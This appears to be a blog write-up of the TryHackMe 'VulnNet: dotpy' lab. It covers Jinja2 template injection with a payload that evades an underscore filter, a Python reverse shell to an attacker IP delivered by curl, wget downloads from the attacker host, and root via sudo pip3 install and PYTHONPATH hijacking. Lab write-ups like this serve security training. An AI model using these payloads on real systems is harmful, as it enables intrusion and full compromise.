---
layout: writeup
category: THM
chall_description: https://tryhackme.com/room/vulnnetdotpy
points: 
solves: 
tags: web, python, privilegeescalation, jinja2, pythonpathhijacking
date: 2021-04-11
comments: true
---

# VulnNet: dotpy
`VulnNet Entertainment is back with their brand new website... and stronger?`

## Ports
```
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

## Reconnaissance

There is a wierd endpoint in the webserver that stops the http server: `/shutdown`
The 404 page will return the folder meaby some SSTI/XSS? We know that the server runs on python it may be jinja2, lets try sending `{{3 * 3}}`. if its jinja2 it should echo 9 back to the page. and ,that worked this will be our point of entry. 

## SSTI / RCE

Now that we have `Server Side Template Injection (SSTI)`, we can try running code on the remote box!
when we try running anything with an `_.[]` it will respond with `INVALID CHARACTERS DETECTED
Your request has been blocked.` i think there are some filters in place. this may make it hard for us.
First we are gonna try to get a urlparameter
The following snippet will read the get parameter `c`
```python
{{request|attr('args')|attr('get')('c')}}?c= 
```

now that we can read c. 
lets try running code on the machine.
```python
{{request|attr('application')|attr( request|attr('args')|attr('get')('us')*2 + "globals" + request|attr('args')|attr('get')('us')*2 ) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2 )( request|attr('args')|attr('get')('us')*2 + 'builtins' + request|attr('args')|attr('get')('us')*2) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2)(request|attr('args')|attr('get')('us')*2 + 'import' + request|attr('args')|attr('get')('us')*2)('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()}}?us=_&c=
```

All of this is to get the `_` from the get parameter `us` and use it in the code, bcause underscores are blocked. 
this is the code when you dont have the underscore blocker
```python
{{request|attr('application')|attr( "__globals__" ) |attr( "__getitem__" )( "__builtins__") |attr( "__getitem__")("__import__")('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()}}?c=
```
Way easier to read. :D

## Reverse Shell

Now that we can run code on the machine lets try running a reverseshell. 
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.4.69",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

```bash
curl -c "SESSION=session-cookie" http://$IP:8080/%7B%7Brequest|attr('application')|attr(%20request|attr('args')|attr('get')('us')*2%20+%20%22globals%22%20+%20request|attr('args')|attr('get')('us')*2%20)%20|attr(%20request|attr('args')|attr('get')('us')*2%20+%20'getitem'%20+%20request|attr('args')|attr('get')('us')*2%20)(%20request|attr('args')|attr('get')('us')*2%20+%20'builtins'%20+%20request|attr('args')|attr('get')('us')*2)%20|attr(%20request|attr('args')|attr('get')('us')*2%20+%20'getitem'%20+%20request|attr('args')|attr('get')('us')*2)(request|attr('args')|attr('get')('us')*2%20+%20'import'%20+%20request|attr('args')|attr('get')('us')*2)('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()%7D%7D?us=_&c=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.8.4.69%22,9999));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27
```

## Changing user
Lets do some enumeration, in the following output we see we can run `/usr/bin/pip3 install` as the user `system-adm`
```bash
sudo -l
# User web may run the following commands on vulnnet-dotpy:
#    (system-adm) NOPASSWD: /usr/bin/pip3 install *
```

Lets check [GTFOBins](https://gtfobins.github.io/) for an exploit, and there is. [PIP Sudo | GTFOBins](https://gtfobins.github.io/gtfobins/pip/#sudo)

```bash
wget 10.8.4.69:8080/pip_setup.py; mv pip_setup.py setup.py
sudo -u system-adm /usr/bin/pip3 install . 
```

And we are `system-adm` in our new shell. Lets get the user flag.
<pre class="command-line" data-prompt="system-adm@vulnnet-dotpy $" data-output="4">
<code class="language-bash">cat ~/user.txt
# THM{********************************}</code></pre>

## Privilege Escalation

lets do some enumeration on the new user.
```bash
sudo -l
# Matching Defaults entries for system-adm on vulnnet-dotpy:
#     env_reset, mail_badpass,
#     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
# 
# User system-adm may run the following commands on vulnnet-dotpy:
#     (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```

we see that we can set an environment variable while executing python3. We can possibly do some **PYTHONPATH hijacking**. 
there is a library imported `zipfile`, lets overwrite that! 

```bash
wget 10.8.4.69:8080/privesc.py ; mv privesc.py zipfile.py
sudo PYTHONPATH=/home/system-adm /usr/bin/python3 /opt/backup.py
```

and we have a new shell. lets check our user!
<pre class="command-line" data-prompt="root@vulnnet-dotpy $" data-output="4">
<code class="language-bash">whoami; id
#root
#uid=0(root) gid=0(root) groups=0(root)</code></pre>

lets cat the root flag!

<pre class="command-line" data-prompt="root@vulnnet-dotpy $" data-output="4">
<code class="language-bash">cat ~/root.txt
# THM{********************************}</code></pre>